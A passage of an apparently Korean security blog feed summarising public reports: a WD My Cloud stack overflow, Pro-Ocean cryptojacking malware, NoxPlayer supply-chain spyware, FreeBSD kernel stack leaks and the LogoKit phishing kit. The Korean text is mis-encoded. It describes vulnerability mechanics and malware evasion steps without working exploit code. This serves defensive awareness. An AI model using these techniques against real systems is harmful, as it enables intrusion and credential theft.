    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.crowdstrike.com/blog/pwn2own-tale-of-a-bug-found-and-lost-again/">Pwn2Own: A Tale of a Bug Found and Lost Again</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>My Cloud Pro Series PR4100 2.31.204 (2019-12-16), 2.40.155 (2020-07-28), 2.40.157 (2020-10-20)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>í•˜ë“œë””ìŠ¤í¬ ìƒì‚° ì—…ì²´ Western Digital(WD)ì˜ ëŒ€ìš©ëŸ‰ ë„¤íŠ¸ì›Œí¬ ìŠ¤í† ë¦¬ì§€ My Cloud Pro ì œí’ˆì—ì„œ ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ í†µí•œ root ê¶Œí•œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>CGI ë°”ì´ë„ˆë¦¬ <code>login_mgr.cgi</code>ëŠ” ë¡œê·¸ì¸ í”„ë¡œì„¸ìŠ¤ì™€ ê´€ë ¨ëœ ì—¬ëŸ¬ ë£¨í‹´ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.</p><p><code>login_mar.cgi</code>ì˜ <code>wd_login()</code> í•¨ìˆ˜ëŠ” IDì™€ íŒ¨ìŠ¤ì›Œë“œë¥¼ ê°ê° <code>username</code>ê³¼ <code>pwd</code> ë§¤ê°œ ë³€ìˆ˜ë¡œ ë°›ì•„ ì¸ì¦ ì‹œë„ë¥¼ í•˜ëŠ”ë°, ì´ë•Œ <code>pwd</code>ëŠ” Base64 ì¸ì½”ë”© ëœ ê°’ì´ì–´ì•¼ í•©ë‹ˆë‹¤. ì´í›„ <code>cgiFormString()</code> í•¨ìˆ˜ì—ì„œ <code>username</code>ê³¼ <code>pwd</code>ë¥¼ ìŠ¤íƒ ë²„í¼ ì¸ <code>username</code>ê³¼ <code>pwd_b64</code>ì— ë³µì‚¬í•©ë‹ˆë‹¤.  <code>base64decode()</code> í•¨ìˆ˜ëŠ” <code>pwd_b64</code>ë¥¼ Base64 ë””ì½”ë”©í•´ <code>pwd_decoded</code>ì— ì €ì¥í•˜ë©° ë””ì½”ë”©ì€ ë‚´ë¶€ì ìœ¼ë¡œ glibcì˜ <code>b64_pton()</code>ì—ì„œ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">char</span> pwd_decoded[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+90h] [rbp-1178h] BYREF</span><span class="hljs-keyword">char</span> pwd_b64[<span class="hljs-number">256</span>];    <span class="hljs-comment">// [rsp+D0h] [rbp-1138h] BYREF</span></code></pre><p>ë””ì½”ë”© ê³¼ì •ì—ì„œ ë””ì½”ë”© ì „ íŒ¨ìŠ¤ì›Œë“œì¸ <code>pwd_b64</code>ì˜ í¬ê¸°ëŠ” 256 bytesì´ì§€ë§Œ ë””ì½”ë”©ëœ íŒ¨ìŠ¤ì›Œë“œê°€ ë³µì‚¬ë˜ëŠ” <code>pwd_decoded</code>ì˜ í¬ê¸°ëŠ” 64 bytesì…ë‹ˆë‹¤. 256 bytes ê¸¸ì´ì˜ base64 ì¸ì½”ë”© ê°’ì˜ ìµœëŒ€ ë””ì½”ë”© ë¬¸ìì—´ ê¸¸ì´ëŠ” 192 bytesë¡œ 64 bytes í¬ê¸°ì¸ <code>pwd_decoded</code>ì— 128 bytes ë§Œí¼ ë°ì´í„°ë¥¼ ë” ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">char</span> password_copy_shadow[<span class="hljs-number">80</span>]; <span class="hljs-comment">// [rsp+ 0h] [rbp-C8h] BYREF</span><span class="hljs-keyword">char</span> password_copy_input[<span class="hljs-number">88</span>];  <span class="hljs-comment">// [rsp+50h] [rbp-78h] BYREF</span></code></pre><p>ì´í›„ <code>check_login()</code> í•¨ìˆ˜ì—ì„œ <code>/etc/shadow</code>ì˜ íŒ¨ìŠ¤ì›Œë“œ í•´ì‹œì™€ ë¹„êµí•˜ê¸° ìœ„í•´ <code>strcpy()</code>ë¡œ <code>pwd_decoded</code> ì—ì„œ <code>password_copy_input</code>ìœ¼ë¡œ ë³µì‚¬í•©ë‹ˆë‹¤. ì´ë•Œ ì´ì „ ì˜¤ë²„í”Œë¡œ ì·¨ì•½ì ìœ¼ë¡œ ì¸í•´ 192 bytes í¬ê¸°ì˜ ë°ì´í„°ê°€ ìˆëŠ” <code>pwd_decoded</code>ì—ì„œ ë³µì‚¬í•˜ê³  ì´ëŠ” <code>check_login()</code>ì˜ ë°˜í™˜ ì£¼ì†Œë¥¼ ë®ì–´ ì›ê²© ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>bof</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>L0ch</tag>
      
      <tag>nas</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Pro-Ocean: Rocke Group&#39;s New Cryptojacking Malware</title>
    <link href="/2021/02/04/idioth/2021-02-04/"/>
    <url>/2021/02/04/idioth/2021-02-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://unit42.paloaltonetworks.com/pro-ocean-rocke-groups-new-cryptojacking-malware/">Pro-Ocean: Rocke Groupâ€™s New Cryptojacking Malware</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache, Orcale, Redis, Tecent Cloud, Alibaba Cloud ë“± í´ë¼ìš°ë“œ ì„œë¹„ìŠ¤</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2019ë…„ Rocke Groupì˜ í´ë¼ìš°ë“œ ì„œë¹„ìŠ¤ë¥¼ íƒ€ê¹ƒìœ¼ë¡œ í•œ Monero ì±„êµ´ê¸°ì— ëŒ€í•œ ë¬¸ì„œê°€ ê³µê°œëœ í›„ ë©€ì›¨ì–´ê°€ ì—…ë°ì´íŠ¸ë˜ì—ˆìŠµë‹ˆë‹¤. í–¥ìƒëœ ë£¨íŠ¸í‚·ê³¼ ì›œì„ ì‚¬ìš©í•˜ì—¬ ë³´ì•ˆ íšŒì‚¬ë“¤ì˜ íƒì§€ ê¸°ìˆ ì„ ìš°íšŒí•˜ê³  í´ë¼ìš°ë“œ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ íƒ€ê¹ƒìœ¼ë¡œ í•œ ë‹¤ìŒê³¼ ê°™ì€ ì•Œë ¤ì§„ ì·¨ì•½ì ì„ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤.</p><ul><li>Apache ActiveMQ(CVE-2016-3088)</li><li>Oracle WebLogic(CVE-2017-10271)</li><li>Redis(unsecure instances)</li></ul><p>Pro-Oceanì€ XMRig Minerë¥¼ í¬í•¨í•˜ë©° íƒì§€ë¥¼ í”¼í•˜ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ë‚œë…í™” ë ˆì´ì–´ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><ul><li>UPXë¡œ íŒ¨í‚¹ë˜ì–´ ìˆê³  íƒì§€ë¥¼ í”¼í•˜ê¸° ìœ„í•´ UPX magic stringì„ ì‚­ì œ</li><li>ì–¸íŒ© ëœ ë°”ì´ë„ˆë¦¬ ì•ˆì— ëª¨ë“ˆì´ gzipìœ¼ë¡œ ì••ì¶•ë˜ì–´ ìˆê³ , XMRig ë°”ì´ë„ˆë¦¬ê°€ ì••ì¶•ëœ ëª¨ë“ˆ ì•ˆì— ì¡´ì¬</li><li>XMRig ë°”ì´ë„ˆë¦¬ ë˜í•œ UPXë¡œ íŒ¨í‚¹ë˜ì–´ ìˆê³  magic stringì´ ì¡´ì¬í•˜ì§€ ì•ŠìŒ</li></ul><p>Pro-Oceanì˜ 4ê°€ì§€ ëª¨ë“ˆì€ ë‹¤ìŒê³¼ ê°™ì€ í•¨ìˆ˜ë¥¼ í†µí•´ ìˆœì„œëŒ€ë¡œ ì¶”ì¶œë˜ê³  ì‹¤í–‰ë©ë‹ˆë‹¤.</p><ol><li><code>main_ReleaseExerkt</code>ì„ í†µí•´ Rootkit Moduleì´ ì‹¤í–‰, ë£¨íŠ¸í‚·ê³¼ ì•…ì„± ì„œë¹„ìŠ¤ ì„¤ì¹˜</li><li><code>main_ReleaseExe</code>ë¥¼ í†µí•´ XMRig Miner ì‹¤í–‰</li><li><code>main_ReleaseExelk</code>ë¥¼ í†µí•´ Watchdog ì‹¤í–‰</li><li><code>main_ReleaseExescan</code>ì„ í†µí•´ infection script ì‹¤í–‰</li></ol><p><code>LD_PRELOAD</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ ì•…ì„± í–‰ìœ„ë¥¼ ìˆ¨ê¸°ê³  <code>Libprocesshider</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ í”„ë¡œì„¸ìŠ¤ë¥¼ ìˆ¨ê¸°ë©° python infection scriptë¥¼ ì‚¬ìš©í•˜ì—¬ public IPì™€ ë™ì¼í•œ 16ë¹„íŠ¸ ì„œë¸Œë„·ì— ìˆëŠ” ëª¨ë“  ì»´í“¨í„°ì— ê°ì—¼ì„ ì‹œë„í•©ë‹ˆë‹¤. python scriptëŠ” ì•…ì„± http ì„œë²„ì—ì„œ installation scriptë¥¼ ë‹¤ìš´ë¡œë“œí•˜ëŠ” í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ Pro-Oceanì„ ì„¤ì¹˜í•˜ì—¬ í™•ì‚°ë©ë‹ˆë‹¤. Installation scriptëŠ” bashë¡œ ì‘ì„±ë˜ì–´ ìˆìœ¼ë©° ë‹¤ìŒê³¼ ê°™ì€ ìˆœì„œë¡œ ë™ì‘í•©ë‹ˆë‹¤.</p><ol><li>Luoxk, BillGates, XMRig, Hashfish ë“±ì˜ ë‹¤ë¥¸ ë©€ì›¨ì–´ë‚˜ Miner ì‚­ì œ ì‹œë„.</li><li>ë‹¤ë¥¸ ë©€ì›¨ì–´ê°€ ë³µêµ¬ë  ìˆ˜ ì—†ë„ë¡ ëª¨ë“  cron task ì‚­ì œ</li><li>ì¸í„°ë„·ì— ëª¨ë“  ì ‘ê·¼ ê¶Œí•œì„ ê°–ê¸° ìœ„í•´ iptables ë°©í™”ë²½ ë¹„í™œì„±í™”</li><li>Tencent Cloudë‚˜ Alibaba Cloudì—ì„œ ë©€ì›¨ì–´ê°€ ì‹¤í–‰ë  ê²½ìš°, íƒì§€ ìš°íšŒë¥¼ ìœ„í•´ ëª¨ë‹ˆí„°ë§ agents ì‚­ì œ</li><li>SSH keyë¥¼ í™•ì¸í•˜ê³  ë‹¤ë¥¸ ê¸°ê¸°ë¥¼ ê°ì—¼ì‹œí‚¤ëŠ” ë° ì‚¬ìš©</li></ol><p>ë˜í•œ Monero ì±„êµ´ì„ íš¨ê³¼ì ìœ¼ë¡œ í•˜ê¸° ìœ„í•´ Watchdog Moduleì„ í†µí•´ CPU ì‚¬ìš©ëŸ‰ì´ 30%ê°€ ë„˜ëŠ” í”„ë¡œì„¸ìŠ¤ë¥¼ ê°•ì œ ì¢…ë£Œí•˜ê³ , ë©€ì›¨ì–´ê°€ ì‘ë™ ì¤‘ì¸ì§€ í™•ì¸í•˜ê³  ì‘ë™ ì•ˆ í•  ì‹œ ì‹¤í–‰ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>cloud</tag>
      
      <tag>cryptocurrency</tag>
      
      <tag>malware</tag>
      
      <tag>monero</tag>
      
      <tag>rocke</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] NoxPlayer Spyware</title>
    <link href="/2021/02/03/fabu1ous/2021-02-03/"/>
    <url>/2021/02/03/fabu1ous/2021-02-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://thehackernews.com/2021/02/a-new-software-supplychain-attack.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+TheHackersNews+(The+Hackers+News+-+Cyber+Security+Blog)">A new Software Supply-Chain Attack Targeted Millions With Spyware</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>NoxPlayer</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ESETì—ì„œ ì•ˆë“œë¡œì´ë“œ ì—ë®¬ë ˆì´í„° NoxPlayerì˜ ì‚¬ìš©ìë¥¼ íƒ€ê²Ÿìœ¼ë¡œ í•œ ì•…ì„± ì½”ë“œê°€ ë°°í¬ë˜ê³  ìˆë‹¤ê³  ë°œí‘œí–ˆìŠµë‹ˆë‹¤. í•´ì»¤ëŠ” NoxPlayerì˜ ê°œë°œì‚¬ BigNoxì˜ íŒŒì¼ í˜¸ìŠ¤íŒ… ì„œë²„ë¥¼ í•´í‚¹í•´ ì—…ë°ì´íŠ¸ ë‹¤ìš´ë¡œë“œ URLì„ ì¡°ì‘í•˜ëŠ” ê²ƒìœ¼ë¡œ ì„¸ ì¢…ë¥˜ì˜ ì•…ì„± ì½”ë“œë¥¼ ë°°í¬í–ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì•…ì„± ì½”ë“œëŠ” ê¸ˆì „ì  ì´ìµ ë³´ë‹¨ íŠ¹ì • ì‚¬ìš©ìë¥¼ ëŒ€ìƒìœ¼ë¡œ í•œ ê°ì‹œ ëª©ì  ê¸°ëŠ¥ì— ì´ˆì ì´ ë§ì¶°ì ¸ ìˆë‹¤ê³  í•©ë‹ˆë‹¤. </p><p>NoxPlayer ì‚¬ìš©ìì—ê²Œ ì•…ì„± ì½”ë“œê°€ ë°°í¬ë˜ëŠ” ê³¼ì •ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>NoxPlayer ì‹œì‘ê³¼ ë™ì‹œì— ì„œë²„ë¡œ ì—…ë°ì´íŠ¸ ìš”ì²­</li><li>ì„œë²„ì—ì„œ BigNox CDN networkë¥¼ í†µí•œ ì—…ë°ì´íŠ¸ ë‹¤ìš´ë¡œë“œ URLì„ ì œê³µ</li><li>í•´ë‹¹ ì—…ë°ì´íŠ¸ ì§„í–‰</li><li>ì—…ë°ì´íŠ¸ê°€ ì•…ì„± ì½”ë“œë¥¼ ë””ë°”ì´ìŠ¤ì— ì œê³µ</li></ol><p>ë°°í¬ëœ ì•…ì„± ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ul><li>Gh0st RAT ( Remote Administration Tool )</li><li>PoisonIvy RAT</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://en.wikipedia.org/wiki/Gh0st_RAT">https://en.wikipedia.org/wiki/Gh0st_RAT</a></p><p><a href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf">https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>spyware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Uninitialized kernel stack leaks in freeBSD</title>
    <link href="/2021/02/02/l0ch/2021-02-02/"/>
    <url>/2021/02/02/l0ch/2021-02-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/elttam/advisories/tree/master/CVE-2020-25578%20CVE-2020-25579">CVE-2020-25578/CVE-2020-25579 freeBSD fsdisclosure</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>freeBSD</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>BSDê³„ì—´ì˜ ì˜¤í”ˆì†ŒìŠ¤ ìš´ì˜ì²´ì œì¸ freeBSDì˜ ì—¬ëŸ¬ íŒŒì¼ ì‹œìŠ¤í…œì—ì„œ ì»¤ë„ ìŠ¤íƒ ì£¼ì†Œë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ë‹¤ìŒì€ ì˜í–¥ì„ ë°›ëŠ” íŒŒì¼ ì‹œìŠ¤í…œì…ë‹ˆë‹¤.</p><ul><li>tmpfs</li><li>smbfs</li><li>autofs</li><li>mqueuefs</li><li>msdosfs</li></ul><p>ì»¤ë„ ìŠ¤íƒ ì£¼ì†Œê°€ ìœ ì¶œë˜ëŠ” <code>dirent</code> êµ¬ì¡°ì²´ëŠ” ë‹¤ìŒê³¼ ê°™ì€ í•„ë“œë¡œ êµ¬ì„±ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> &#123;</span>                                                                     <span class="hljs-keyword">ino_t</span>      d_fileno;        <span class="hljs-comment">/* file number of entry */</span>                          <span class="hljs-keyword">off_t</span>      d_off;       <span class="hljs-comment">/* directory offset of entry */</span>                         <span class="hljs-keyword">__uint16_t</span> d_reclen;        <span class="hljs-comment">/* length of this record */</span>                         <span class="hljs-keyword">__uint8_t</span>  d_type;      <span class="hljs-comment">/* file type, see below */</span>                              <span class="hljs-keyword">__uint8_t</span>  d_pad0;                                                              <span class="hljs-keyword">__uint16_t</span> d_namlen;        <span class="hljs-comment">/* length of string in d_name */</span>                    <span class="hljs-keyword">__uint16_t</span> d_pad1;                                                          <span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __BSD_VISIBLE                                                               </span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXNAMLEN   255                                                         </span>    <span class="hljs-keyword">char</span>    d_name[MAXNAMLEN + <span class="hljs-number">1</span>];  <span class="hljs-comment">/* name must be no longer than this */</span>      <span class="hljs-meta">#<span class="hljs-meta-keyword">else</span>                                                                           </span>    <span class="hljs-keyword">char</span>    d_name[<span class="hljs-number">255</span> + <span class="hljs-number">1</span>];    <span class="hljs-comment">/* name must be no longer than this */</span>          <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span>                                                                          </span>&#125;;</code></pre><p>ì´ì¤‘ msdosfsì˜ ì·¨ì•½ì ì€ <code>msdosfs_readdir</code> í•¨ìˆ˜ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. í•´ë‹¹ í•¨ìˆ˜ì—ì„œëŠ” MSDOS íŒŒì¼ ì‹œìŠ¤í…œì˜ ë£¨íŠ¸ì—ì„œ <code>readdir</code> ì´ í˜¸ì¶œëœ ê²½ìš° <code>dirent_terminate</code>ì—ì„œ <code>d_pad0</code>, <code>d_pad1</code>,<code>d_name</code> í•„ë“œë¥¼ ì´ˆê¸°í™”í•œ ì´í›„ <code>uiomove</code> í•¨ìˆ˜ì—ì„œ <code>struct dirent dirbuf</code> ê°ì²´ì˜ ë°ì´í„°ë¥¼ ìœ ì € ëœë“œë¡œ ë³µì‚¬í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ë£¨íŠ¸ ì´ì™¸ì˜ MSDOS íŒŒì¼ ì‹œìŠ¤í…œì—ì„œ <code>readdir</code>ì„ í˜¸ì¶œí•œ ê²½ìš° <code>d_pad0</code>, <code>d_pad1</code> í•„ë“œê°€ ì´ˆê¸°í™”ë˜ì§€ ì•Šì€ ìƒíƒœë¡œ <code>uiomove</code> í•¨ìˆ˜ë¥¼ í†µí•´ ë°ì´í„°ê°€ ìœ ì € ëœë“œë¡œ ë³µì‚¬ë˜ì–´ ì»¤ë„ì˜ ìŠ¤íƒ ì£¼ì†Œë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>msdosfsë¥¼ ì œì™¸í•œ íŒŒì¼ ì‹œìŠ¤í…œì€ ë‹¤ìŒ í•¨ìˆ˜ ëª©ë¡ì—ì„œ ì»¤ë„ ìŠ¤íƒì— <code>struct dirent</code> ê°ì²´ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤.</p><ul><li><code>tmpfs_dir_getdotdent</code></li><li><code>tmpfs_dir_getdotdotdent</code></li><li><code>smbfs_readvdir</code></li><li><code>autofs_readdir_one</code></li><li><code>mqfs_readdir</code></li></ul><p>ê·¸ëŸ¬ë‚˜ ê°ì²´ì˜ ë°ì´í„°ë¥¼ ìœ ì € ëœë“œë¡œ ë³µì‚¬í•˜ê¸° ì „ì—<code>d_off</code> í•„ë“œë¥¼ ì´ˆê¸°í™”í•˜ì§€ ì•Šì•„ ì»¤ë„ì˜ ìŠ¤íƒ ì£¼ì†Œê°€ ë‚¨ì•„ìˆìœ¼ë©° ì´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>uninitialized stack</tag>
      
      <tag>L0ch</tag>
      
      <tag>freeBSD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] í”¼ì‹± í¼ ë°ì´í„°ë¥¼ ë™ì ìœ¼ë¡œ ìƒì„±í•˜ëŠ” LogoKit</title>
    <link href="/2021/02/01/idioth/2021-02-01/"/>
    <url>/2021/02/01/idioth/2021-02-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://community.riskiq.com/article/a068810a">LogoKit: Simple, Effective, and Deceptive</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>ì•…ì„± URLì— ì ‘ê·¼í•˜ëŠ” ì‚¬ëŒ</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>RiskIQì—ì„œ DOM(Document Object Model)ê³¼ ìƒí˜¸ ì‘ìš©í•˜ì—¬ HTML form dataë¥¼ ë™ì ìœ¼ë¡œ ìƒì„±í•˜ëŠ” í”¼ì‹± í‚¤íŠ¸ì¸ LogoKitì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.</p><p>LogoKitì€ ë³µì¡í•œ ë ˆì´ì•„ì›ƒê³¼ ë‹¤ì–‘í•œ íŒŒì¼ì„ í™œìš©í•˜ëŠ” ë‹¤ë¥¸ í”¼ì‹± í‚¤íŠ¸ì™€ ë‹¬ë¦¬ embeddableí•œ ìë°”ìŠ¤í¬ë¦½íŠ¸ í•¨ìˆ˜ë¥¼ ëª¨ì•„ë’€ìœ¼ë©° DOMê³¼ì˜ ìƒí˜¸ ì‘ìš©ì„ í†µí•´ ì‚¬ìš©ì ìƒí˜¸ ì‘ìš© ì—†ì´ í˜ì´ì§€ ë‚´ì˜ ì½˜í…ì¸ ì™€ HTML form dataë¥¼ ë™ì ìœ¼ë¡œ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>LogoKitì€ í”¼í•´ìì˜ ì´ë©”ì¼ì´ í¬í•¨ëœ URL(<code>phishingpage[.]site/login.html#victim@company.com</code>)ì„ ì´ë©”ì¼ë¡œ ì „ì†¡í•©ë‹ˆë‹¤. URLì— í¬í•¨ëœ ì´ë©”ì¼ì€ <a href="https://developer.mozilla.org/en-US/docs/Web/API/Location/hash">location hash</a>ë¡œ ì‚¬ìš©ì/íšŒì‚¬ ë„ë©”ì¸ìœ¼ë¡œ ë‚˜ë‰˜ì–´ ì €ì¥ë˜ë©° íšŒì‚¬ ë„ë©”ì¸ ë¡œê³ ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤. ë˜í•œ <code>username</code> í•„ë“œì— ì´ë©”ì¼ì„ ìë™ìœ¼ë¡œ ì±„ì›Œ í”¼í•´ìê°€ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ë„ë¡ ìœ ë„í•©ë‹ˆë‹¤. í”¼í•´ìê°€ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ë©´ ì´ë©”ì¼ì´ ìœ íš¨í•œ ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ì„œ ì²« ë²ˆì§¸ ì…ë ¥ì€ ì•”í˜¸ê°€ í‹€ë ¸ìœ¼ë‹ˆ ë‹¤ì‹œ ì…ë ¥í•˜ë¼ëŠ” ë©”ì‹œì§€ë¥¼ í‘œì‹œí•˜ê³  ë‘ ë²ˆì§¸ ì…ë ¥ì—ì„œ ì´ë©”ì¼ê³¼ ì•”í˜¸ë¥¼ ì™¸ë¶€ë¡œ ì „ì†¡í•œ í›„ íšŒì‚¬ ì‚¬ì´íŠ¸ë¡œ ë¦¬ë‹¤ì´ë ‰ì…˜ í•©ë‹ˆë‹¤.</p><p>LogokitëŠ” ê·œëª¨ê°€ ì‘ê³  íšŒì‚¬ ë¡œê·¸ì¸ í¬í„¸ì„ ëª¨ë°©í•˜ëŠ” ì‹ì˜ ê°„ë‹¨í•œ ë°©ë²•ì„ í†µí•´ êµ¬ì¶•ì´ ê°€ëŠ¥í•˜ë©°, Firebase, Github, Oracle Cloud ë“± ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ê³µê°œ ì„œë¹„ìŠ¤ì— Javascriptë¥¼ í˜¸ìŠ¤íŒ… í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ë§¤ìš° ìœ„í˜‘ì ì…ë‹ˆë‹¤. ë˜í•œ íƒ€ê¹ƒ ë‹¹ ë‹¨ì¼ URLì„ ê°–ê³  íšŒì‚¬ ë¡œê³ ë¥¼ ì‚¬ìš©í•˜ë¯€ë¡œ ì‰½ê²Œ ìœ„í˜‘ì— ë…¸ì¶œë  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ë§ì€ ì£¼ì˜ê°€ í•„ìš”í•©ë‹ˆë‹¤.</p><p>LogoKit í”¼ì‹± ë§í¬ì˜ ì˜ˆì‹œ : <code>hxxps://324634XXXa2616-dot-XXXX-301XX4.df.r.appspot.com/#recruitmentXXX@XXX.com</code></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>social engineering</tag>
      
      <tag>idioth</tag>
      
      <tag>logokit</tag>
      
      <tag>phishkit</tag>
      
      <tag>phishing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwní•˜ê³  Coolí•˜ê³  Sexyí•œ Windows íƒë°©ê¸° part1 - pwntools for windows</title>
    <link href="/2021/01/31/l0ch/pwncoolsexy-part1/"/>
    <url>/2021/01/31/l0ch/pwncoolsexy-part1/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš” L0chì…ë‹ˆë‹¤! ì˜¤ëŠ˜ì€ ìƒˆë¡œ ì—°ì¬í•  ì‹œë¦¬ì¦ˆë¬¼ì„ ì£¼ì„¬ì£¼ì„¬ ì±™ê²¨ ì™”ìŠµë‹ˆë‹¤. ì œëª©ë¶€í„° ì •ìƒì´ ì•„ë‹Œ ëŠë‚Œì´ ìŠ¬ìŠ¬ ì˜¤ì‹œì£ ..?</p><p>ë•ŒëŠ” ì‹œë¦¬ì¦ˆë¬¼ ê¸°íš íšŒì˜ ì¤‘ ì•„ë¬´ ìƒê° ì—†ì´ â€œí€(pwn)ì¿¨ì„¹ì¢Œ ì»¨ì…‰ ì–´ë–°?â€ì´ë¼ê³  ë§í–ˆëŠ”ë° íŒ€ì›ë“¤ ë°˜ì‘ì´ ê²©í•˜ë”ë¼êµ¬ìš”.</p><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/1.png"></p><blockquote><p>ë‚´ê°€ ì´ êµ¬ì—­ì˜ ë¯¸ì¹œXì´ë‹¤!!</p></blockquote><p>íšŒì˜í•˜ë©´ì„œ ë”´ì§“í•˜ë‹¤ê°€ ë±‰ì€ ë§ì´ ë³¸ì˜ ì•„ë‹ˆê²Œ ê·¹ì°¬(?)ì„ ë“¤ì–´ë²„ë ¤ íƒ„ìƒí•œ ìƒˆë¡œìš´ ì‹œë¦¬ì¦ˆ.. ê³¼ì—° ì œëŒ€ë¡œ ë§ˆë¬´ë¦¬í•  ìˆ˜ ìˆì„ì§€!</p><h1 id="pwnableì€-coolí•˜ê³ -sexyí•˜ê²Œ"><a href="#pwnableì€-coolí•˜ê³ -sexyí•˜ê²Œ" class="headerlink" title="pwnableì€ coolí•˜ê³  sexyí•˜ê²Œ"></a>pwnableì€ coolí•˜ê³  sexyí•˜ê²Œ</h1><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/2.png"></p><blockquote><p>í¬ë„ˆë¸”ì„ í•  ë•ŒëŠ” ì¦ê±°ì›Œì•¼ í•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  ì¿¨í•˜ê³  